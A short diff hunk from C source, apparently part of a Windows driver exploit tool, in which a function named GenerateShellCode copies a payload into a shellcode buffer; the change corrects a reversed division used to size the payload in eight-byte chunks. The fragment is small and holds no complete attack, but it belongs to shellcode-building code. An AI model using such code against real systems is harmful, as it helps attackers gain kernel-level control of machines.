@@ -324,7 +324,7 @@ void *GenerateShellCode(HANDLE driverHandle)
 
     RtlMoveMemory(shellcode,payload,oldPayloadSize);
 
-    payloadSizeInEight = (int ) (8 / payloadSize );
+    payloadSizeInEight = (int ) (payloadSize / 8);
     printf("[+] Payload size by eigth: %i\n",payloadSizeInEight);
 
     for (int i = 0; i < payloadSizeInEight;i+=8)
